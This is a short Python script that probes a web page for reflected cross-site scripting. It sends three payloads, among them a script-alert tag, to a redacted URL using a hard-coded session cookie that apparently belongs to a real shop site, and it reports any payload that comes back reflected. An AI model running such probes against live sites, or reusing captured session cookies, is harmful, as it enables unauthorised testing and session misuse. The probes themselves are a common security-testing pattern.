from email import header
import requests

header = {
"Cookie" : "PHPSESSID=jbk9mbes5tp1sgidl86b7tmav2; default=3bj713j3iamatpbmuraa7la8g5; language=tr-tr; currency=TRY; twk_idm_key=i_K3W0K_P1tZyCycg0pnt; TawkConnectionTime=0; twk_uuid_60fd5c34d6e7610a49ace7a8=%7B%22uuid%22%3A%221.485HjAa3IFeKtYWJmbBWI0MmSWz0kuLU4VTfvsKMpM6lJl2yrXbGv7h2oLzWNdioaVW1Brjz73kSysHAfXj7PrSftVBrA8iywESG71MsW8L1K6wXcxzStbHkPG4u1LIpwzVwpoAGJ0lGwLc%22%2C%22version%22%3A3%2C%22domain%22%3A%22erikcim.com%22%2C%22ts%22%3A1663664161300%7D"    
}
xss_list = ["siber" , "<h1>Siber</h1>", "<script>alert('siber')</script>"]

for payload in xss_list:
    print(payload)
    url = "http: ***************" + str(payload)
    sonuc = requests.get(url=url , headers=header)
    if str(payload) in str(sonuc.content):
        print("Muhtemelen XSS var: ", str(payload))